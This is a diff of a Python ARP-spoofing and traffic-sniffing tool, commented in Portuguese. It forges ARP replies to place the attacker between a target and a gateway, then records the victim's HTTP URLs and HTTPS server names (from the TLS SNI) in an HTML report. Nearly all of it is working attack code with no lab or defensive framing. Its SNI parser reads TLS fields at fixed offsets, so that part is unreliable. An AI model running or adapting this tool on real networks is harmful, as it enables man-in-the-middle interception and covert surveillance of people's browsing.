@@ -129,22 +129,35 @@ def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
     """
     Cria um pacote ARP para spoofing.
     """
+    # Verifica e converte os endereços MAC para bytes
+    if isinstance(target_mac, str):
+        target_mac = bytes.fromhex(target_mac.replace(':', ''))
+    if isinstance(sender_mac, str):
+        sender_mac = bytes.fromhex(sender_mac.replace(':', ''))
+
+    # Certifica-se de que os endereços MAC têm exatamente 6 bytes
+    if len(target_mac) != 6 or len(sender_mac) != 6:
+        raise ValueError("Endereços MAC devem ter exatamente 6 bytes")
+
+    # Cabeçalho Ethernet
     ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP
+
+    # Cabeçalho ARP
     arp_header = struct.pack(
         "!HHBBH6s4s6s4s",
-        1,               # Hardware type (Ethernet)
-        0x0800,          # Protocol type (IPv4)
-        6,               # Hardware size
-        4,               # Protocol size
-        2,               # Opcode (reply)
-        sender_mac,      # Sender MAC address
-        socket.inet_aton(sender_ip),  # Sender IP address
-        target_mac,      # Target MAC address
-        socket.inet_aton(target_ip),  # Target IP address
+        1,                                # Hardware type (Ethernet)
+        0x0800,                           # Protocol type (IPv4)
+        6,                                # Hardware size
+        4,                                # Protocol size
+        2,                                # Opcode (reply)
+        sender_mac,                       # Sender MAC address
+        socket.inet_aton(sender_ip),      # Sender IP address
+        target_mac,                       # Target MAC address
+        socket.inet_aton(target_ip)       # Target IP address
     )
+
     return ether_header + arp_header
 
-# Função para obter o MAC de um endereço IP
 def get_mac(ip, interface):
     """
     Realiza uma resolução ARP para obter o MAC associado a um IP.
@@ -152,17 +165,24 @@ def get_mac(ip, interface):
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
     sock.bind((interface, 0))
     mac = None
-    for _ in range(5):  # Tenta algumas vezes para garantir
-        packet = create_arp_packet(ip, b"\xff\xff\xff\xff\xff\xff", "0.0.0.0", b"\x00\x00\x00\x00\x00\x00")
-        sock.send(packet)
-        response = sock.recv(65535)
-        if response[12:14] == b"\x08\x06":  # Verifica se é ARP
-            sender_ip = socket.inet_ntoa(response[28:32])
-            if sender_ip == ip:
-                mac = response[22:28]
-                break
+
+    for _ in range(10):  # Aumentar o número de tentativas
+        try:
+            packet = create_arp_packet(ip, b"\xff\xff\xff\xff\xff\xff", "0.0.0.0", b"\x00\x00\x00\x00\x00\x00")
+            sock.send(packet)
+            sock.settimeout(2)  # Timeout de 2 segundos
+            response = sock.recv(65535)
+            if response[12:14] == b"\x08\x06":  # Verifica se é um pacote ARP
+                sender_ip = socket.inet_ntoa(response[28:32])
+                if sender_ip == ip:
+                    mac = response[22:28]  # Captura os 6 bytes do endereço MAC
+                    sock.close()
+                    return mac
+        except socket.timeout:
+            continue  # Tenta novamente em caso de timeout
     sock.close()
-    return mac
+    raise Exception(f"MAC não encontrado para o IP {ip}")
+
 
 # Função para enviar ARP Spoofing
 def arp_spoof(target_ip, gateway_ip, interface):
@@ -184,19 +204,20 @@ def arp_spoof(target_ip, gateway_ip, interface):
         sock.send(gateway_packet)
         time.sleep(2)
 
-# Função para obter o MAC do atacante
+# Função para obter o MAC do próprio atacante
 def get_attacker_mac(interface):
     """
     Obtém o MAC do próprio atacante na interface especificada.
     """
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     sock.bind((interface, 0))
-    return sock.getsockname()[4]
+    mac = sock.getsockname()[4]  # Obtém os primeiros 6 bytes do endereço MAC
+    return mac
 
 # Função para capturar tráfego
 def capture_traffic(interface, output_file):
     """
-    Captura pacotes DNS e HTTP e salva em um relatório HTML.
+    Captura pacotes DNS, HTTP e HTTPS e salva em um relatório HTML com tradução de URLs.
     """
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     with open(output_file, "w") as f:
@@ -209,15 +230,89 @@ def capture_traffic(interface, output_file):
                 ip_header = packet[14:34]
                 ip_proto = struct.unpack("!B", ip_header[9:10])[0]
                 src_ip = socket.inet_ntoa(ip_header[12:16])
+                dest_ip = socket.inet_ntoa(ip_header[16:20])
 
-                if ip_proto == 6:  # TCP (HTTP)
+                if ip_proto == 6:  # TCP (HTTP e HTTPS)
                     tcp_header = packet[34:54]
                     src_port, dest_port = struct.unpack("!HH", tcp_header[0:4])
+
+                    # Processamento de HTTP
                     if dest_port == 80:  # HTTP
-                        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-                        f.write(f"<li>{timestamp} - {src_ip} - HTTP Traffic Detected</li>\n")
-                        f.flush()
+                        try:
+                            http_data = packet[54:].decode(errors='ignore')
+                            headers = http_data.split("\r\n")
+                            host = ""
+                            path = ""
+                            for header in headers:
+                                if header.lower().startswith("host:"):
+                                    host = header.split(": ")[1]
+                                if header.startswith("GET") or header.startswith("POST"):
+                                    path = header.split(" ")[1]
+                            if host:  # Apenas registra se o host foi identificado
+                                url = f"http://{host}{path}" if path else f"http://{host}/"
+                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                                f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
+                                f.flush()
+                        except Exception as e:
+                            pass
+
+                    # Processamento de HTTPS
+                    elif dest_port == 443:  # HTTPS
+                        try:
+                            tls_data = packet[54:]
+                            if len(tls_data) < 5:  # Verifica se os dados TLS estão presentes
+                                continue
+                            server_name = extract_sni(tls_data)
+                            if server_name:  # Apenas registra se o SNI foi identificado
+                                url = f"https://{server_name}/"
+                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                                f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
+                                f.flush()
+                        except Exception as e:
+                            pass
         f.write("</ul></body></html>\n")
+
+# Função para extrair o Server Name Indication (SNI)
+def extract_sni(tls_data):
+    """
+    Extrai o Server Name Indication (SNI) de um pacote TLS Client Hello.
+    """
+    try:
+        # Verifica se é um pacote TLS válido e se o tamanho é suficiente
+        if len(tls_data) < 45 or tls_data[0] != 0x16 or tls_data[5] != 0x01:  # TLS Handshake + Client Hello
+            return None
+
+        # Extensões TLS começam no byte 45
+        extensions_length = struct.unpack("!H", tls_data[43:45])[0]
+        if len(tls_data) < 45 + extensions_length:  # Verifica se o pacote contém todas as extensões
+            return None
+
+        # Procura por SNI nas extensões TLS
+        extensions_start = 45
+        extensions_end = extensions_start + extensions_length
+        extensions_data = tls_data[extensions_start:extensions_end]
+
+        index = 0
+        while index < len(extensions_data):
+            if len(extensions_data[index:index + 4]) < 4:  # Verifica se há dados suficientes para o tipo e tamanho da extensão
+                break
+            extension_type = struct.unpack("!H", extensions_data[index:index + 2])[0]
+            extension_length = struct.unpack("!H", extensions_data[index + 2:index + 4])[0]
+
+            if extension_type == 0x00:  # SNI encontrado
+                if len(extensions_data[index + 4:index + 4 + extension_length]) < extension_length:
+                    break
+                server_name_length = struct.unpack("!H", extensions_data[index + 9:index + 11])[0]
+                if len(extensions_data[index + 11:index + 11 + server_name_length]) < server_name_length:
+                    break
+                server_name = extensions_data[index + 11:index + 11 + server_name_length].decode('utf-8', errors='ignore')
+                return server_name
+
+            index += 4 + extension_length
+    except Exception as e:
+        print(f"[Erro ao extrair SNI]: {e}")
+    return None
+
 
 # Função principal
 def main():
